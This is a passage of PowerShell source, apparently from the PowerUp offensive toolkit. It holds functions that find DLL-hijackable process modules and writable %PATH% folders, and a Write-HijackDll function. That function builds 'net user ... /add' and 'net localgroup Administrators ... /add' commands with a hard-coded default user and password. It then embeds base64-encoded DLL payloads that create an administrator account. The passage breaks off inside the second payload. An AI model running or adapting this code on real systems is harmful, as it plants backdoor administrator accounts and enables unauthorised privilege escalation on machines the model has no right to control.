        [Parameter(Position = 0, ValueFromPipeline = $True, ValueFromPipelineByPropertyName = $True)]
        [Alias('ProcessName')]
        [String[]]
        $Name = $(Get-Process | Select-Object -Expand Name),

        [Switch]
        $ExcludeWindows,

        [Switch]
        $ExcludeProgramFiles,

        [Switch]
        $ExcludeOwned
    )

    BEGIN {
        # the known DLL cache to exclude from our findings
        #   http://blogs.msdn.com/b/larryosterman/archive/2004/07/19/187752.aspx
        $Keys = (Get-Item "HKLM:\System\CurrentControlSet\Control\Session Manager\KnownDLLs")
        $KnownDLLs = $(ForEach ($KeyName in $Keys.GetValueNames()) { $Keys.GetValue($KeyName).tolower() }) | Where-Object { $_.EndsWith(".dll") }
        $KnownDLLPaths = $(ForEach ($name in $Keys.GetValueNames()) { $Keys.GetValue($name).tolower() }) | Where-Object { -not $_.EndsWith(".dll") }
        $KnownDLLs += ForEach ($path in $KnownDLLPaths) { ls -force $path\*.dll | Select-Object -ExpandProperty Name | ForEach-Object { $_.tolower() }}
        $CurrentUser = [System.Security.Principal.WindowsIdentity]::GetCurrent().Name

        # get the owners for all processes
        $Owners = @{}
        Get-WmiObject -Class win32_process | Where-Object {$_} | ForEach-Object { $Owners[$_.handle] = $_.getowner().user }
    }

    PROCESS {

        ForEach ($ProcessName in $Name) {

            $TargetProcess = Get-Process -Name $ProcessName

            if ($TargetProcess -and $TargetProcess.Path -and ($TargetProcess.Path -ne '') -and ($Null -ne $TargetProcess.Path)) {

                try {
                    $BasePath = $TargetProcess.Path | Split-Path -Parent
                    $LoadedModules = $TargetProcess.Modules
                    $ProcessOwner = $Owners[$TargetProcess.Id.ToString()]

                    ForEach ($Module in $LoadedModules){

                        $ModulePath = "$BasePath\$($Module.ModuleName)"

                        # if the module path doesn't exist in the process base path folder
                        if ((-not $ModulePath.Contains('C:\Windows\System32')) -and (-not (Test-Path -Path $ModulePath)) -and ($KnownDLLs -NotContains $Module.ModuleName)) {

                            $Exclude = $False

                            if ($PSBoundParameters['ExcludeWindows'] -and $ModulePath.Contains('C:\Windows')) {
                                $Exclude = $True
                            }

                            if ($PSBoundParameters['ExcludeProgramFiles'] -and $ModulePath.Contains('C:\Program Files')) {
                                $Exclude = $True
                            }

                            if ($PSBoundParameters['ExcludeOwned'] -and $CurrentUser.Contains($ProcessOwner)) {
                                $Exclude = $True
                            }

                            # output the process name and hijackable path if exclusion wasn't marked
                            if (-not $Exclude){
                                $Out = New-Object PSObject
                                $Out | Add-Member Noteproperty 'ProcessName' $TargetProcess.ProcessName
                                $Out | Add-Member Noteproperty 'ProcessPath' $TargetProcess.Path
                                $Out | Add-Member Noteproperty 'ProcessOwner' $ProcessOwner
                                $Out | Add-Member Noteproperty 'ProcessHijackableDLL' $ModulePath
                                $Out.PSObject.TypeNames.Insert(0, 'PowerUp.HijackableDLL.Process')
                                $Out
                            }
                        }
                    }
                }
                catch {
                    Write-Verbose "Error: $_"
                }
            }
        }
    }
}


function Find-PathDLLHijack {

    [Diagnostics.CodeAnalysis.SuppressMessageAttribute('PSShouldProcess', '')]
    [OutputType('PowerUp.HijackableDLL.Path')]
    [CmdletBinding()]
    Param()

    # use -Literal so the spaces in %PATH% folders are not tokenized
    Get-Item Env:Path | Select-Object -ExpandProperty Value | ForEach-Object { $_.split(';') } | Where-Object {$_ -and ($_ -ne '')} | ForEach-Object {
        $TargetPath = $_
        $ModifidablePaths = $TargetPath | Get-ModifiablePath -Literal | Where-Object {$_ -and ($Null -ne $_) -and ($Null -ne $_.ModifiablePath) -and ($_.ModifiablePath.Trim() -ne '')}
        ForEach ($ModifidablePath in $ModifidablePaths) {
            if ($Null -ne $ModifidablePath.ModifiablePath) {
                $ModifidablePath | Add-Member Noteproperty '%PATH%' $_
                $ModifidablePath | Add-Member Aliasproperty Name '%PATH%'
                $ModifidablePath.PSObject.TypeNames.Insert(0, 'PowerUp.HijackableDLL.Path')
                $ModifidablePath
            }
        }
    }
}


function Write-HijackDll {

    [Diagnostics.CodeAnalysis.SuppressMessageAttribute('PSShouldProcess', '')]
    [Diagnostics.CodeAnalysis.SuppressMessageAttribute('PSAvoidUsingUserNameAndPassWordParams', '')]
    [Diagnostics.CodeAnalysis.SuppressMessageAttribute('PSAvoidUsingPlainTextForPassword', '')]
    [OutputType('PowerUp.HijackableDLL')]
    [CmdletBinding()]
    Param(
        [Parameter(Mandatory = $True)]
        [String]
        [ValidateNotNullOrEmpty()]
        $DllPath,

        [String]
        [ValidateSet('x86', 'x64')]
        $Architecture,

        [String]
        [ValidateNotNullOrEmpty()]
        $BatPath,

        [String]
        $UserName = 'john',

        [String]
        $Password = 'Password123!',

        [String]
        $LocalGroup = 'Administrators',

        [Management.Automation.PSCredential]
        [Management.Automation.CredentialAttribute()]
        $Credential = [Management.Automation.PSCredential]::Empty,

        [String]
        [ValidateNotNullOrEmpty()]
        $Command
    )

    function local:Invoke-PatchDll {
    <#
    .SYNOPSIS

    Helpers that patches a string in a binary byte array.

    .PARAMETER DllBytes

    The binary blob to patch.

    .PARAMETER SearchString

    The string to replace in the blob.

    .PARAMETER ReplaceString

    The string to replace SearchString with.
    #>

        [OutputType('System.Byte[]')]
        [CmdletBinding()]
        Param(
            [Parameter(Mandatory = $True)]
            [Byte[]]
            $DllBytes,

            [Parameter(Mandatory = $True)]
            [String]
            $SearchString,

            [Parameter(Mandatory = $True)]
            [String]
            $ReplaceString
        )

        $ReplaceStringBytes = ([System.Text.Encoding]::UTF8).GetBytes($ReplaceString)

        $Index = 0
        $S = [System.Text.Encoding]::ASCII.GetString($DllBytes)
        $Index = $S.IndexOf($SearchString)

        if ($Index -eq 0) {
            throw("Could not find string $SearchString !")
        }

        for ($i=0; $i -lt $ReplaceStringBytes.Length; $i++) {
            $DllBytes[$Index+$i]=$ReplaceStringBytes[$i]
        }

        return $DllBytes
    }

    if ($PSBoundParameters['Command']) {
        $BatCommand = $Command
    }
    else {
        if ($PSBoundParameters['Credential']) {
            $UserNameToAdd = $Credential.UserName
            $PasswordToAdd = $Credential.GetNetworkCredential().Password
        }
        else {
            $UserNameToAdd = $UserName
            $PasswordToAdd = $Password
        }

        if ($UserNameToAdd.Contains('\')) {
            # only adding a domain user to the local group, no user creation
            $BatCommand = "net localgroup $LocalGroup $UserNameToAdd /add"
        }
        else {
            # create a local user and add it to the local specified group
            $BatCommand = "net user $UserNameToAdd $PasswordToAdd /add && timeout /t 5 && net localgroup $LocalGroup $UserNameToAdd /add"
        }
    }

    # generate with base64 -w 0 hijack32.dll > hijack32.b64
    $DllBytes32 = "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Q29weXJpZ2h0QXR0cmlidXRlAEFzc2VtYmx5Q29tcGFueUF0dHJpYnV0ZQBSdW50aW1lQ29tcGF0aWJpbGl0eUF0dHJpYnV0ZQBTYXZlAFN5c3RlbS5SdW50aW1lLlZlcnNpb25pbmcAQXV0aGVudGljYWJsZVByaW5jaXBhbABVc2VyUHJpbmNpcGFsAGFkZGVyLmRsbC5kbGwAYWRkZXIuZGxsAFByb2dyYW0AU3lzdGVtAE1haW4AU3lzdGVtLlJlZmxlY3Rpb24ALmN0b3IAU3lzdGVtLkRpYWdub3N0aWNzAFN5c3RlbS5SdW50aW1lLkludGVyb3BTZXJ2aWNlcwBTeXN0ZW0uUnVudGltZS5Db21waWxlclNlcnZpY2VzAERlYnVnZ2luZ01vZGVzAGFyZ3MAT2JqZWN0AFN5c3RlbS5EaXJlY3RvcnlTZXJ2aWNlcy5BY2NvdW50TWFuYWdlbWVudABQcmluY2lwYWxDb250ZXh0AAAACS4AbgBlAHQAABEhAHEAQQB6AEAAdwBTAHgAAAAAALrTAjVXX+VMnuqBIYczyhsABCABAQgDIAABBSABARERBCABAQ4EIAEBAgYHAhJFEkkFIAEBEU0FIAEBEkUFFRFZAQIFIAEBEwAIIAEBFRFZAQIIt3pcVhk04IkFAAEBHQ4IAQAIAAAAAAAeAQABAFQCFldyYXBOb25FeGNlcHRpb25UaHJvd3MBCAEABwEAAAAADgEACWFkZGVyLmRsbAAABQEAAAAAFwEAEkNvcHlyaWdodCDCqSAgMjAyNAAAKQEAJDlkNzJmMWFmLTkwNmUtNDQ2Ni1iN2M3LWY3NDQ0ODZhMGU3OAAADAEABzEuMC4wLjAAAE0BABwuTkVURnJhbWV3b3JrLFZlcnNpb249djQuNy4yAQBUDhRGcmFtZXdvcmtEaXNwbGF5TmFtZRQuTkVUIEZyYW1ld29yayA0LjcuMgAAAADSpcHLAAAAAAIAAABWAAAAICgAACAKAAAAAAAAAAAAAAAAAAAQAAAAAAAAAAAAAAAAAAAAUlNEU+JfKvjmEbRMkLFpTHmUmYEBAAAAQzpcVXNlcnNcdXNlcnhcc291cmNlXHJlcG9zXGFkZGVyLmRsbFxvYmpcRGVidWdcYWRkZXIuZGxsLnBkYgCeKAAAAAAAAAAAAAC4KAAAACAAAAAA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"
    $DllBytes64 = "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Q29weXJpZ2h0QXR0cmlidXRlAEFzc2VtYmx5Q29tcGFueUF0dHJpYnV0ZQBSdW50aW1lQ29tcGF0aWJpbGl0eUF0dHJpYnV0ZQBTYXZlAFN5c3RlbS5SdW50aW1lLlZlcnNpb25pbmcAQXV0aGVudGljYWJsZVByaW5jaXBhbABVc2VyUHJpbmNpcGFsAGFkZGVyLmRsbC5kbGwAYWRkZXIuZGxsAFByb2dyYW0AU3lzdGVtAE1haW4AU3lzdGVtLlJlZmxlY3Rpb24ALmN0b3IAU3lzdGVtLkRpYWdub3N0aWNzAFN5c3RlbS5SdW50aW1lLkludGVyb3BTZXJ2aWNlcwBTeXN0ZW0uUnVudGltZS5Db21waWxlclNlcnZpY2VzAERlYnVnZ2luZ01vZGVzAGFyZ3MAT2JqZWN0AFN5c3RlbS5EaXJlY3RvcnlTZXJ2aWNlcy5BY2NvdW50TWFuYWdlbWVudABQcmluY2lwYWxDb250ZXh0AAAACS4AbgBlAHQAABEhAHEAQQB6AEAAdwBTAHgAAAAAALrTAjVXX+VMnuqBIYczyhsABCABAQgDIAABBSABARERBCABAQ4EIAEBAgYHAhJFEkkFIAEBEU0FIAEBEkUFFRFZAQIFIAEBEwAIIAEBFRFZAQIIt3pcVhk04IkFAAEBHQ4IAQAIAAAAAAAeAQABAFQCFldyYXBOb25FeGNlcHRpb25UaHJvd3MBCAEABwEAAAAADgEACWFkZGVyLmRsbAAABQEAAAAAFwEAEkNvcHlyaWdodCDCqSAgMjAyNAAAKQEAJDlkNzJmMWFmLTkwNmUtNDQ2Ni1iN2M3LWY3NDQ0ODZhMGU3OAAADAEABzEuMC4wLjAAAE0BABwuTkVURnJhbWV3b3JrLFZlcnNpb249djQuNy4yAQBUDhRGcmFtZXdvcmtEaXNwbGF5TmFtZRQuTkVUIEZyYW1ld29yayA0LjcuMgAAAADSpcHLAAAAAAIAAABWAAAAICgAACAKAAAAAAAAAAAAAAAAAAAQAAAAAAAAAAAAAAAAAAAAUlNEU+JfKvjmEbRMkLFpTHmUmYEBAAAAQzpcVXNlcnNcdXNlcnhcc291cmNlXHJlcG9zXGFkZGVyLmRsbFxvYmpcRGVidWdcYWRkZXIuZGxsLnBkYgCeKAAAAAAAAAAAAAC4KAAAACAAAAAA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